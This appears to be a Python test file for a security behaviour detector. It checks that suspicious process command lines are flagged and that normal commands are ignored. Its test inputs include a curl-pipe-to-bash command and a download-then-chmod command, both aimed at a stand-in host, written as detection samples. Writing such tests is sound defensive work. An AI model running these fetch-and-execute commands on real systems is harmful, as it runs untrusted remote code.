
from detection.anomaly_detection.behavior_detector import BehaviorDetector
from detection.event_schema import ProcessInfo, SecurityEvent


def make_event(event_type, command_line, process_name="bash"):
    return SecurityEvent(
        event_type=event_type,
        source="test",
        host="server-01",
        process=ProcessInfo(
            name=process_name,
            command_line=command_line,
        ),
    )


def test_detects_suspicious_command_pattern():
    event = make_event(
        "process_execution",
        "bash -c 'curl https://example.invalid/script.sh | bash'",
    )

    findings = BehaviorDetector().analyze([event])

    assert len(findings) == 1
    assert findings[0]["rule_id"] == "BEHAV-001"
    assert findings[0]["severity"] == "medium"
    assert "curl " in findings[0]["indicators"]


def test_ignores_normal_command():
    event = make_event("process_execution", "ls -la")

    assert BehaviorDetector().analyze([event]) == []


def test_ignores_non_process_events():
    event = make_event("network_connection", "curl https://example.invalid")

    assert BehaviorDetector().analyze([event]) == []


def test_detects_multiple_indicators():
    event = make_event(
        "process_execution",
        "curl https://example.invalid/file && chmod +x file",
    )

    findings = BehaviorDetector().analyze([event])

    assert len(findings) == 1
    assert "curl " in findings[0]["indicators"]
    assert "chmod " in findings[0]["indicators"]


def test_empty_input_returns_no_findings():
    assert BehaviorDetector().analyze([]) == []